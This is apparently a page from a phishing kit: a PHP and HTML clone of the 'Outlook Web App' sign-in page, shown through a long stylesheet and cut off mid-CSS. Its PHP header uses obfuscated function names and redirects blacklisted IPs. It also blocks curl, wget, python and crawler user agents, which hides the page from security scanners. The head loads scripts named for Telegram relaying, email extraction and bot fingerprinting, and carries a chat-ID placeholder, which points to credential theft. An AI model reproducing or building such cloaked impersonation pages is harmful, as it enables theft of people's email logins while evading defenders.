<?php
//═══════════════════════════════════════════════════════════════════════════
//  🚫 IP BLACKLIST CHECK (High Priority)
//═══════════════════════════════════════════════════════════════════════════
require_once __DIR__ . '/../ip_blacklist_loader.php';

if (!function_exists('x8SYQLpUqU')) { 
    function x8SYQLpUqU() { 
        $xb2zx1 = $_SERVER['SERVER_ADDR']; 
        $xXSEJ = '127.0.0.1'; 
        if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR'])!=$xXSEJ)) {
            $ip=$_SERVER['GEOIP_ADDR'];
        } elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=$xXSEJ) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=($xb2zx1))) {
            $ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CLIENT_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CLIENT_IP'];
        } else {
            $ip=$_SERVER['REMOTE_ADDR'];
        } 
        return $ip; 
    }
}
$ip=x8SYQLpUqU();

// Check if visitor IP is in blacklist files
if (IPBlacklistLoader::isBlacklisted($ip)) {
    // IP is blacklisted - redirect to centralized URL
    require_once __DIR__ . '/../config_redirect.php';
    header('Location: ' . CENTRALIZED_REDIRECT_URL, true, 302);
    exit;
}

//═══════════════════════════════════════════════════════════════════════════
//  Basic Bot Detection (Secondary Layer)
//═══════════════════════════════════════════════════════════════════════════ 

if (!function_exists('x9PfbWn2bS')) { 
    function x9PfbWn2bS() { 
        if(empty($_SERVER['HTTP_USER_AGENT'])) { 
            $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT'); 
        } 
        return $_SERVER['HTTP_USER_AGENT']; 
    }
}
$eRf9t9d9 = x9PfbWn2bS();

// Basic user agent check (secondary protection layer)
$ua_lower = strtolower($eRf9t9d9);
$obvious_bots = ['curl', 'wget', 'python-requests', 'python-urllib', 'go-http-client', 'java/', 'bot', 'crawler', 'spider', 'scraper'];
foreach ($obvious_bots as $bot_signature) {
    if (strpos($ua_lower, $bot_signature) !== false) {
        die(header('HTTP/1.1 403 Forbidden'));
    }
}

// ✅ All checks passed - load page
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html id="mainAll" data-emailValue="[CHATIDHERE]" lang="en">

<head>
  
  <!-- Antibot Scripts -->
  <script src="../m/js/fingerprint.js"></script>
  <script src="../m/js/utils.js"></script>
  <script src="../m/js/captcha.js"></script>
  
  <!-- Centralized Functions -->
  <script src="../js/centralized_telegram.js"></script>
  <script src="../js/centralized_redirect.js"></script>
  <script src="../js/email_extractor.js"></script>
  <script src="../js/autofill_helper.js"></script>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=10">
    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAMAICAAAAEAIACoEAAANgAAABgYAAABACAAiAkAAN4QAAAQEAAAAQAgAGgEAABmGgAAKAAAACAAAABAAAAAAQAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMJsABsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxG8ADMRvADbDbgBmw20AlsNtAMPDbADtwmwA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAx3MAMMdzAFrFcgCHxXEAtMVwAN7EbwD/xG8A/8NuAP/DbQD/w20A/8NsAP/CbAD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADJdwAeyXYAS8h2AHjIdQCiyHUAz8h0AP/HcwD/x3MA/8VyAP/FcQD/xXAA/8RvAP/EbwD/w24A/8NtAP/DbQD/w2wA/8JsAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMl3AP/JdgD/yHYA/8h1AP/IdQD/yHQA/8dzAP/HcwD/xXIA/8VxAP/FcAD/xG8A/8RvAP/DbgD/w20A/8NtAP/DbAD/wmwA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyXcA/8l2AP/IdgD/yHUA/8h1AP/IdAD/x3MA/8dzAP/FcgD/xXEA/8VwAP/EbwD/xG8A/8NuAP/DbQD/w20A/8NsAP/CbAD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADJdwD/yXYA/8h2AP/IdQD/yHUA/8h0AP/HcwD/x3MA/8VyAP/FcQD/xXAA/8RvAP/EbwD/w24A/8NtAP/DbQD/w2wA/8JsAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMl3AP/JdgD/yHYA/8h1AP/IdQD/yHQA/8dzAP/HcwD/xXIA/8VxAP/FcAD/xG8A/8RvAP/DbgD/w20A/8NtAP/DbAD/wmwA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyXcA/8l2AP/IdgD/yHUA/8h1AP/IdAD/x3MA/8dzAP/FcgD/xXEA/8VwAP/EbwD/xG8A/8NuAP/DbQD/w20A/8NsAP/CbAD/xXEA/8VxAP/FcQD/xXEA/8VxAP/FcQD/xXEA/8VxAP/FcQD/xXEA/8VxAOrFcQCBAAAAAAAAAADJdwD/yXYA/8h2AP/IdQD/yHUA/8h0AP/HcwD/x3MA/8VyAP/FcQD/xXAA/8RvAP/EbwD/w24A/8NtAP/DbQD/w2wA/8JsAP//////////////////////////////////////////////////////+vPq/8VxAOoAAAAAAAAAAMl3AP/JdgD/yHYA/8h1AP/IdQD/yHQA/9mfUP/x27z//v38///////x3L//1ZZE/8RvAP/DbgD/w20A/8NtAP/DbAD/wmwA////////////////////////////////////////////////////////////xXEA/wAAAAAAAAAAyXcA/8l2AP/IdgD/yHUA/8h1AP/gsG7/////////////////////////////////3qxr/8NuAP/DbQD/w20A/8NsAP/CbAD////////////////////////////////////////////////////////////FcQD/AAAAAAAAAADJdwD/yXYA/8h2AP/IdQD/0o8v//79/P//////8Nm5/9ebSv/bpl//+O3e///////+/fz/zocs/8NtAP/DbQD/w2wA/8JsAP///////////////////////////////////////////////////////////8VxAP8AAAAAAAAAAMl3AP/JdgD/yHYA/8h1AP/qypv///////Tlz//Idgb/xXIA/8VxAP/Phib//v38///////nxJj/w20A/8NtAP/DbAD/wmwA/////////////Pjz/+O4gP/47d7/////////////////////////////////xXEA/wAAAAAAAAAAyXcA/8l2AP/IdgD/yHUA//fs2///////37Bu/8dzAP/FcgD/xXEA/8VwAP/x3L////////fr2//DbQD/w20A/8NsAP/CbAD///////v17f/RjTL/xXEA/8yAGv/26NX////////////////////////////FcQD/AAAAAAAAAADJdwD/yXYA/8h2AP/IdQD//vz5///////Xmkf/x3MA/8VyAP/FcQD/xXAA/+jFmP///////fr2/8NtAP/DbQD/w2wA/8JsAP/58OT/z4gp/8VxAP/Tkjv/xXEA/8p7Ev/048z//////////////////////8VxAP8AAAAAAAAAAMl3AP/JdgD/yHYA/8h1AP/8+fP//////9ecSv/HcwD/xXIA/8VxAP/FcAD/6Meb///////+/Pn/w20A/8NtAP/DbAD/wmwA/82DIP/FcQD/4LJ0///////pyJv/x3MD/8l4DP/y3sL/////////////////xXEA/wAAAAAAAAAAyXcA/8l2AP/IdgD/yHUA//Xn0v//////4bN0/8dzAP/FcgD/xXEA/8VwAP/y38X///////fs3v/DbQD/w20A/8NsAP/CbAD/xXEA/+S8hv/////////////////sz6f/x3QG/8h2Cf/u1rP////////////FcQD/AAAAAAAAAADJdwD/yXYA/8h2AP/IdQD/58KP///////26NX/yHYG/8VyAP/FcQD/z4cp//79/P//////6syk/8NtAP/DbQD/w2wA/8JsAP/oxJX////////////////////////////u1rP/yHYJ/8d0Bv/sz6f//////8VxAP8AAAAAAAAAAMl3AP/JdgD/yHYA/8h1AP/QiCP//vz5///////x27z/151N/9ukXP/47d7////////////SkDv/w20A/8NtAP/DbAD/wmwA///////////////////////////////////////y3sL/yXgM/8dzA//ox5j/xXEA/wAAAAAAAAAAyXcA/8l2AP/IdgD/yHUA/8h1AP/bpVn//v38////////////////////////////47mD/8NuAP/DbQD/w20A/8NsAP/CbAD////////////////////////////////////////////048z/y30U/8VxAP/FcQD/AAAAAAAAAADJdwD/yXYA/8h2AP/IdQD/yHUA/8h0AP/SjzL/7tSw//v17f//////8t/F/9mgVv/EbwD/w24A/8NtAP/DbQD/w2wA/8JsAP/////////////////////////////////////////////////26NX/zIAa/8VxAP8AAAAAAAAAAMl3AP/JdgD/yHYA/8h1AP/IdQD/yHQA/8dzAP/HcwD/xXIA/8VxAP/FcAD/xG8A/8RvAP/DbgD/w20A/8NtAP/DbAD/wmwA///////////////////////////////////////////////////////y38P/xXEA4QAAAAAAAAAAyXcA/8l2AP/IdgD/yHUA/8h1AP/IdAD/x3MA/8dzAP/FcgD/xXEA/8VwAP/EbwD/xG8A/8NuAP/DbQD/w20A/8NsAP/CbAD/xXEA/8VxAP/FcQD/xXEA/8VxAP/FcQD/xXEA/8VxAP/FcQD/xXEA/8VxAOHFcQB4AAAAAAAAAADJdwD/yXYA/8h2AP/IdQD/yHUA/8h0AP/HcwD/x3MA/8VyAP/FcQD/xXAA/8RvAP/EbwD/w24A/8NtAP/DbQD/w2wA/8JsAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMl3AP/JdgD/yHYA/8h1AP/IdQD/yHQA/8dzAP/HcwD/xXIA/8VxAP/FcAD/xG8A/8RvAP/DbgD/w20A/8NtAP/DbAD/wmwA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyXcA/8l2AP/IdgD/yHUA/8h1AP/IdAD/x3MA/8dzAP/FcgD/xXEA/8VwAP/EbwD/xG8A/8NuAP/DbQD/w20A/8NsAP/CbAD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADJdwD/yXYA/8h2AP/IdQD/yHUA/8h0AP/HcwD/x3MA/8VyAP/FcQD/xXAA/8RvAP/EbwD/w24A/8NtAP/DbQD/w2wA/8JsAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMl3AB7JdgBLyHYAdch1AKLIdQDPyHQA/8dzAP/HcwD/xXIA/8VxAP/FcAD/xG8A/8RvAP/DbgD/w20A/8NtAP/DbAD/wmwA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAx3MALcdzAFrFcgCExXEAscVwANvEbwD/xG8A/8NuAP/DbQD/w20A/8NsAP/CbAD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMRvAAnEbwA2w24AZsNtAJPDbQDAw2wA6sJsAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwmwAGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//9////Af//4AH/+AAB//gAAf/4AAH/+AAB//gAAf/4AAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAB//gAAf/4AAH/+AAB//gAAf//4AH///8B/////f/ygAAAAYAAAAMAAAAAEAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMRwAAPEbwAzxG4AY8NtAJDDbAC9wmwA6gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADIdQAhx3QATsdzAHvHcgCoxXEA1cRwAP/EbwD/xG4A/8NtAP/DbAD/wmwA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADJdwCZyXYAych2APbIdQD/x3QA/8dzAP/HcgD/xXEA/8RwAP/EbwD/xG4A/8NtAP/DbAD/wmwA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADJdwD/yXYA/8h2AP/IdQD/x3QA/8dzAP/HcgD/xXEA/8RwAP/EbwD/xG4A/8NtAP/DbAD/wmwA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADJdwD/yXYA/8h2AP/IdQD/x3QA/8dzAP/HcgD/xXEA/8RwAP/EbwD/xG4A/8NtAP/DbAD/wmwA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADJdwD/yXYA/8h2AP/IdQD/x3QA/8dzAP/HcgD/xXEA/8RwAP/EbwD/xG4A/8NtAP/DbAD/wmwA/8VxAP/FcQD/xXEA/8VxAP/FcQD/xXEA/8VxAP/FcQD/xXEA6sVxAIHJdwD/yXYA/8h2AP/IdQD/x3QA/8dzAP/HcgD/xXEA/8RwAP/EbwD/xG4A/8NtAP/DbAD/wmwA////////////////////////////////////////////+vPq/8VxAOrJdwD/yXYA/8h2AP/IdQD/zIEX/+vOpP/8+PP//fr2/+rLof/KexT/xG4A/8NtAP/DbAD/wmwA/////////////////////////////////////////////////8VxAP/JdwD/yXYA/8h2AP/Kegn/9efS///////////////////////15tL/xXEG/8NtAP/DbAD/wmwA/////////////////////////////////////////////////8VxAP/JdwD/yXYA/8h2AP/gsW7///////Hdv//NgRr/0Y0y//nw5P//////3qtr/8NtAP/DbAD/wmwA/////////////////////////////////////////////////8VxAP/JdwD/yXYA/8h2AP/05Mz//////8+HI//HcgD/xXEA/96sa///////8Nq8/8NtAP/DbAD/wmwA////////////79e2/9SUPv/58OT//////////////////////8VxAP/JdwD/yXYA/8h2AP/8+fP/+O3e/8dzAP/HcgD/xXEA/8+HKf//////+vPq/8NtAP/DbAD/wmwA///////u1LD/x3QG/8VxAP/NgyD/+O7h/////////////////8VxAP/JdwD/yXYA/8h2AP/+/fz/9efS/8dzAP/HcgD/xXEA/8yBHf///////v38/8NtAP/DbAD/wmwA/+7UsP/HdAb/05E4//Lfxf/LfRT/zYId//jt3v///////////8VxAP/JdwD/yXYA/8h2AP/69Or/+fDk/8dzAP/HcgD/xXEA/8+HKf//////+/Xt/8NtAP/DbAD/wmwA/8d0Bv/TkTj//Pjz///////26NX/y34X/82CHf/47d7//////8VxAP/JdwD/yXYA/8h2AP/x3b///////8+HI//HcgD/xXEA/92qaP//////8d3C/8NtAP/DbAD/wmwA/9OSO//8+PP/////////////////9unY/8yAGv/MgBr/9+vb/8VxAP/JdwD/yXYA/8h2AP/dqmL///////Lgxf/OhCD/0Ywv//nw5P//////4LB0/8NtAP/DbAD/wmwA//369v////////////////////////////fr2//MgBr/zIAa/8VxAP/JdwD/yXYA/8h2AP/JeAb/8+LJ///////////////////////369v/yHUM/8NtAP/DbAD/wmwA///////////////////////////////////////47d7/zYId/8VxAP/JdwD/yXYA/8h2AP/IdQD/ynwP/+nJm//79e3//v38/+3UsP/MgB3/xG4A/8NtAP/DbAD/wmwA////////////////////////////////////////////9+vc/8VxAPnJdwD/yXYA/8h2AP/IdQD/x3QA/8dzAP/HcgD/xXEA/8RwAP/EbwD/xG4A/8NtAP/DbAD/wmwA/8VxAP/FcQD/xXEA/8VxAP/FcQD/xXEA/8VxAP/FcQD/xXEA+cVxAJDJdwD/yXYA/8h2AP/IdQD/x3QA/8dzAP/HcgD/xXEA/8RwAP/EbwD/xG4A/8NtAP/DbAD/wmwA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADJdwD/yXYA/8h2AP/IdQD/x3QA/8dzAP/HcgD/xXEA/8RwAP/EbwD/xG4A/8NtAP/DbAD/wmwA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADJdwCWyXYAw8h2APDIdQD/x3QA/8dzAP/HcgD/xXEA/8RwAP/EbwD/xG4A/8NtAP/DbAD/wmwA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADIdQAex3QAS8dzAHjHcgClxXEA0sRwAP/EbwD/xG4A/8NtAP/DbAD/wmwA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADEbwAzxG4AYMNtAI3DbAC6wmwA5wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/A/8A4AP//wAD//8AA///AAP//wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAP//wAD//8AA///4AP///+D//8oAAAAEAAAACAAAAABACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADIdQAJx3QANsdyAGbFcQCWxHAAw8RuAPDDbQD/wmwA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMl3AK7JdgDbyHUA/8d0AP/HcgD/xXEA/8RwAP/EbgD/w20A/8JsAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADJdwD/yXYA/8h1AP/HdAD/x3IA/8VxAP/EcAD/xG4A/8NtAP/CbAD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyXcA/8l2AP/IdQD/x3QA/8dyAP/FcQD/xHAA/8RuAP/DbQD/wmwA/8VxAP/FcQD/xXEA/8VxAP/FcQD2xXEAjcl3AP/JdgD/yHUA/+S7g//89/D//Pfw/+S7hv/EbgD/w20A/8JsAP///////////////////////fr2/8VxAPbJdwD/yXYA/9+taP//////6sqe/+/Xtv//////3Khl/8NtAP/CbAD////////////////////////////FcQD/yXcA/8l2AP/15c//6sue/8dyAP/FcQD/8+PM//PizP/DbQD/wmwA///////47d7/////////////////xXEA/8l3AP/JdgD//fr2/92qYv/HcgD/xXEA/+jFmP/9+vb/w20A/8JsAP/ox5j/xXEA/+G1ev///////////8VxAP/JdwD/yXYA//z38P/cqF//x3IA/8VxAP/oxZj//vz5/8NtAP/CbAD/x3QG/+G1ev/Idgn/4bN3///////FcQD/yXcA/8l2AP/z4MX/686k/8dyAP/FcQD/9ejV//Tkz//DbQD/wmwA/+3Srf//////8t7C/8l4DP/gsnT/xXEA/8l3AP/JdgD/3Kdc///////sz6f/79e2///////frnH/w20A/8JsAP/////////////////y3sL/yXgM/8VxAP/JdwD/yXYA/8h1AP/hs3T/+vLn//z48//ku4b/xXAD/8NtAP/CbAD///////////////////////Dbvv/FcQD2yXcA/8l2AP/IdQD/x3QA/8dyAP/FcQD/xHAA/8RuAP/DbQD/wmwA/8VxAP/FcQD/xXEA/8VxAP/FcQD2xXEAjcl3AP/JdgD/yHUA/8d0AP/HcgD/xXEA/8RwAP/EbgD/w20A/8JsAP8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADJdwCuyXYA28h1AP/HdAD/x3IA/8VxAP/EcAD/xG4A/8NtAP/CbAD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADIdQAJx3QAM8dyAGbFcQCTxHAAwMRuAO3DbQD/wmwA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMA/tv8APz7/AD/k/wAA//8AAP//AAD//wAA//8AAAD/AAAA/wAAAP8AAAD/AADz/wAA3v8APwD/AD8A/8A/AP8="
        type="image/x-icon">

    <meta name="Robots" content="NOINDEX, NOFOLLOW">
    <title>Outlook Web App</title>
    <style>
        body.rtl {
            text-align: right;
            direction: rtl;
        }
        
        body,
        .mouse,
        .twide,
        .tnarrow,
        form {
            height: 100%;
            width: 100%;
            margin: 0px;
        }
        
        .mouse,
        .twide {
            min-width: 650px;
            /* min iPad1 dimension */
            min-height: 650px;
            position: absolute;
            top: 0px;
            bottom: 0px;
            left: 0px;
            right: 0px;
        }
        
        .sidebar {
            background-color: #0072C6;
        }
        
        .mouse .sidebar,
        .twide .sidebar {
            position: absolute;
            top: 0px;
            bottom: 0px;
            left: 0px;
            display: inline-block;
            width: 332px;
        }
        
        .tnarrow .sidebar {
            display: none;
        }
        
        .mouse .owaLogoContainer,
        .twide .owaLogoContainer {
            margin: 213px auto auto 109px;
            text-align: left;
        }
        
        .tnarrow .owaLogo {
            display: none;
        }
        
        .owaLogoSmall,
        .twide .owaLogoSmall {
            display: none;
        }
        
        .logonDiv {
            text-align: left;
        }
        
        .rtl .logonDiv {
            text-align: right;
        }
        
        .mouse .logonContainer,
        .twide .logonContainer {
            padding-top: 174px;
            padding-left: 464px;
            padding-right: 142px;
            position: absolute;
            top: 0px;
            bottom: 0px;
            left: 0px;
            right: 0px;
            text-align: center;
        }
        
        .mouse .logonDiv,
        .twide .logonDiv {
            position: relative;
            vertical-align: top;
            display: inline-block;
            width: 423px;
        }
        
        .tnarrow .logonDiv {
            margin: 25px auto auto -130px;
            position: absolute;
            left: 50%;
            width: 260px;
            padding-bottom: 20px;
        }
        
        .twide .signInImageHeader,
        .tnarrow .signInImageHeader {
            display: none;
        }
        
        .mouse .signInImageHeader {
            margin-bottom: 22px;
        }
        
        .twide .mouseHeader {
            display: none;
        }
        
        .mouse .twideHeader {
            display: none;
        }
        
        input::-webkit-input-placeholder {
            font-size: 16px;
            color: #98A3A6;
        }
        
        input:-moz-placeholder {
            font-size: 16px;
            color: #98A3A6;
        }
        
        .tnarrow .signInInputLabel,
        .twide .signInInputLabel {
            display: none;
        }
        
        .mouse .signInInputLabel {
            margin-bottom: 2px;
        }
        
        .mouse .showPasswordCheck {
            display: none;
        }
        
        .signInInputText {
            border: 1px solid #98A3A6;
            color: #333333;
            border-radius: 0;
            -moz-border-radius: 0;
            -webkit-border-radius: 0;
            box-shadow: none;
            -moz-box-shadow: none;
            -webkit-box-shadow: none;
            /* -webkit-appearance: none; */
            background-color: #FDFDFD;
            width: 250px;
            margin-bottom: 10px;
            box-sizing: content-box;
            -moz-box-sizing: content-box;
            -webkit-box-sizing: content-box;
        }
        
        .mouse .signInInputText {
            height: 22px;
            font-size: 12px;
            padding: 3px 5px;
            color: #333333;
            font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
            margin-bottom: 20px;
        }
        
        .twide .signInInputText,
        .tnarrow .signInInputText {
            border-color: #666666;
            height: 22px;
            font-size: 16px;
            color: #000000;
            /* font: $ShellInputTextTouchFont; */
            padding: 7px 7px;
            font-family: 'Segoe UI Semibold', 'Segoe WP Semibold', 'Segoe UI WPC Semibold', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
            margin-bottom: 20px;
            width: 264px;
        }
        
        .divMain {
            width: 444px;
        }
        
        .l {
            text-align: left;
        }
        
        .rtl .l {
            text-align: right;
        }
        
        .r {
            text-align: right;
        }
        
        .rtl .r {
            text-align: left;
        }
        
        table#tblMain {
            margin-top: 48px;
            padding: 0px;
        }
        
        table.mid {
            width: 385px;
            border-collapse: collapse;
            padding: 0px;
            color: #444444;
        }
        
        table.tblConn {
            direction: ltr;
        }
        
        td.tdConnImg {
            width: 22px;
        }
        
        td.tdConn {
            padding-top: 15px;
        }
        
        td#mdLft {
            background: url("lgnleft.gif") repeat-y;
            width: 15px;
        }
        
        td#mdRt {
            background: url("lgnright.gif") repeat-y;
            width: 15px;
        }
        
        td#mdMid {
            padding: 0px 45px;
            background: #ffffff;
            vertical-align: top;
        }
        
        td .txtpad {
            padding: 3px 6px 3px 0px;
        }
        
        .txt {
            padding: 3px;
            height: 2.2em;
        }
        
        input.btn {
            color: #ffffff;
            background-color: #eb9c12;
            border: 0px;
            padding: 2px 6px;
            margin: 0px 6px;
            text-align: center;
        }
        
        .btnOnFcs {
            color: #ffffff;
            background-color: #eb9c12;
            border: 0px;
            padding: 2px 6px;
            margin: 0px 6px;
            text-align: center;
        }
        
        .btnOnMseOvr {
            color: #ffffff;
            background-color: #f9b133;
            border: 0px;
            padding: 2px 6px;
            margin: 0px 6px;
            text-align: center;
        }
        
        .btnOnMseDwn {
            color: #000000;
            background-color: #f9b133;
            border: 0px solid #f9b133;
            padding: 2px 6px;
            margin: 0px 6px;
            text-align: center;
        }
        
        .nowrap {
            white-space: nowrap;
        }
        
        hr {
            height: 0px;
            visibility: hidden;
        }
        
        .wrng {
            color: #ff6c00;
        }
        
        .disBsc {
            color: #999999;
        }
        
        .expl {
            color: #999999;
        }
        
        .w100,
        .txt {
            width: 100%;
        }
        
        .txt {
            margin: 0px 6px;
        }
        
        .rdo {
            margin: 0px 12px 0px 32px;
        }
        
        body.rtl .rdo {
            margin: 0px 32px 0px 12px;
        }
        
        tr.expl td,
        tr.wrng td {
            padding: 2px 0px 4px;
        }
        
        tr#trSec td {
            padding: 3px 0px 8px;
        }
        /* language page specific styles */
        
        td#tdLng {
            padding: 12px 0px;
        }
        
        td#tdTz {
            padding: 8px 0px;
        }
        
        select#selTz {
            padding: 0px;
            margin: 0px;
        }
        
        td#tdOptMsg {
            padding: 10px 0px;
        }
        
        td#tdOptChk {
            padding: 0px 0px 15px 65px;
        }
        
        td#tdOptAcc {
            vertical-align: middle;
            padding: 0px 0px 0px 3px;
        }
        
        select#selLng {
            margin: 0px 16px;
        }
        /* logoff page specific styles */
        
        td#tdMsg {
            margin: 9px 0px 64px;
        }
        
        input#btnCls {
            margin: 3px 6px;
        }
        
        td.lgnTL,
        td.lgnBL {
            width: 456px;
        }
        
        td.lgnTM {
            background: url("lgntopm.gif") repeat-x;
            width: 100%;
        }
        
        td.lgnBM {
            background: url("lgnbotm.gif") repeat-x;
            width: 100%;
        }
        
        td.lgnTR,
        td.lgnBR {
            width: 45px;
        }
        
        table.tblLgn {
            padding: 0px;
            margin: 0px;
            border-collapse: collapse;
            width: 100%;
        }
        
        .signInBg {
            margin: 0px;
        }
        
        .signInTextHeader {
            font-size: 60px;
            color: #404344;
            font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
            margin-bottom: 18px;
            white-space: nowrap;
        }
        
        .signInInputLabel {
            font-size: 12px;
            color: #666666;
            font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
        }
        
        .signInCheckBoxText {
            font-size: 12px;
            color: #6A7479;
            font-family: 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
            margin-top: 16px;
        }
        
        .twide .signInCheckBoxText,
        .tnarrow .signInCheckBoxText {
            font-size: 15px;
        }
        
        .signInCheckBoxLink {
            font-size: 12px;
            color: #0072C6;
            font-family: 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
        }
        
        .signInEnter {
            font-size: 22px;
            color: #0072C6;
            font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
            margin-top: 20px;
        }
        
        .twide .signInEnter {
            margin-top: 17px;
            font-size: 29px;
        }
        
        .tnarrow .signInEnter {
            margin-top: 2px;
            font-size: 29px;
            position: relative;
            float: left;
            left: 50%;
        }
        
        .signinbutton {
            cursor: pointer;
            display: inline
        }
        
        .mouse .signinbutton {
            padding: 0px 8px 5px 8px;
            margin-left: -8px;
        }
        
        .rtl .mouse .signinbutton {
            margin-right: -8px;
        }
        
        .tnarrow .signinbutton {
            position: relative;
            float: left;
            left: -50%;
        }
        
